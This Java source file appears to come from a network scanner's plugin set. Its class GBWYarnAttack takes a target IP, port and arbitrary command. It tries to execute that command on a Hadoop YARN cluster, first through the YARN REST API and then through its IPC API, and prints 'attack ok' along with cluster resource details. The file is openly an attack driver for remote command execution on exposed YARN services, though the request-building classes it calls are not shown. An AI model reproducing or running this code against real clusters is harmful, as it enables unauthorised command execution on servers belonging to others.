package com.gbw.scanner.plugins.scripts.hadoop.yarn;

import com.gbw.scanner.Host;
import com.gbw.scanner.sink.SinkQueue;
import com.gbw.scanner.sink.es.ESSinkQueue;
import com.xmap.api.utils.TextUtils;

import java.util.ArrayList;
import java.util.List;

public class GBWYarnAttack {


    private static  GBWScanYarnConfig makeConfig(String queue,String appname,String cmd){

        List<String> cmds = new ArrayList<>();
        cmds.add(cmd);

        GBWScanYarnConfig config = new GBWScanYarnConfig();

        config.setRunCmd(true);
        config.setCmds(cmds);

        if(!TextUtils.isEmpty(queue))
            config.setQueue(queue);

        if(!TextUtils.isEmpty(appname))
            config.setAppname(appname);

        return config;
    }

    private static void processResponse(SinkQueue sinkQueue,StringBuffer sb){

        if(!sinkQueue.isEmpty()) {

            GBWScanYarnResult res = (GBWScanYarnResult) sinkQueue.take();
            TextUtils.addText(sb,"APPID",res.getAppID());
            TextUtils.addLong(sb,"MaxMemory",res.getMaxMem());
            TextUtils.addInt(sb,"MaxVCores",res.getMaxVcores());
            TextUtils.addInt(sb,"HadoopNodes",res.getNodes());

        }else{
            sb.append("Response is Empty!\n");
        }
    }

    public static String runCmd(String proto,String ip,int port,String queue,String appname,String cmd){

        GBWScanYarnConfig config = makeConfig(queue,appname,cmd);

        GBWScanYarnRestScript restScript = new GBWScanYarnRestScript(config);
        GBWScanYarnIPCScript  ipcScript = new GBWScanYarnIPCScript(config);

        Host host = new Host(ip,ip,port,null,TextUtils.isEmpty(proto)?"http":proto);

        SinkQueue sinkQueue = new ESSinkQueue();

        boolean res = false;

        StringBuffer sb = new StringBuffer();


        sb.append("Try to attack hadoop yarn by hadoop yarn restfull api------------------------\n");
        res = restScript.scan(host,sinkQueue);
        if(res){
            sb.append("Attack hadoop yarn by hadoop yarn restfull api ok!\n");
            sb.append("response------->\n");
            processResponse(sinkQueue,sb);
           return sb.toString();
        }

        sb.append("Try to attack hadoop yarn by hadoop yarn ipc api----------------------------\n");
        res = ipcScript.scan(host,sinkQueue);
        if(res){

            sb.append("Attack hadoop yarn by hadoop yarn ipc api ok!\n");
            sb.append("response------->\n");
            processResponse(sinkQueue,sb);
            return sb.toString();
        }

        sb.append("Attack hadoop yarn failed!\n");
        return sb.toString();
    }



}
